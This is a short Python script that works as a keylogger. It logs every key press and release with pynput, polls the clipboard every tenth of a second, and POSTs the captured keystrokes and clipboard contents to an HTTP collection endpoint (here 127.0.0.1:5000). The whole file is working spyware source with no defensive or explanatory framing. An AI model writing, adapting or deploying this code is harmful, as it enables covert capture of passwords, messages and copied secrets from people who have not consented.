from pynput import keyboard
import threading
import time
import requests
import pyperclip

dataVal = []

def main():
    # Spawning the thread to write to the log file every 5 seconds.
    sendKeyThread = threading.Thread(target=keySender)
    sendClipThread = threading.Thread(target=clipSender)
    sendKeyThread.start()
    sendClipThread.start()
    with keyboard.Listener(on_press=recordPress, on_release=recordRelease) as listener:
        listener.join()


def recordPress(key):
    global dataVal
    dataVal.append(f"pressed {key}\n")

def recordRelease(key):
    global dataVal
    dataVal.append(f"released {key}\n")

def keySender():
    while True:
        global dataVal
        if len(dataVal) != 0:
            dataCopy = dataVal.copy()
            dataVal = dataVal[len(dataCopy):]
            postReq = requests.post("http://127.0.0.1:5000/write", json={"data": dataCopy})        
        time.sleep(5)

def clipSender():
    prevValue = ""
    while True:
        tmp_value = pyperclip.paste()
        if tmp_value != prevValue:
            prevValue = tmp_value
            postReq = requests.post("http://127.0.0.1:5000/writeClip", json={"data": str(prevValue)})  
        time.sleep(0.1)

if __name__=="__main__":
    main()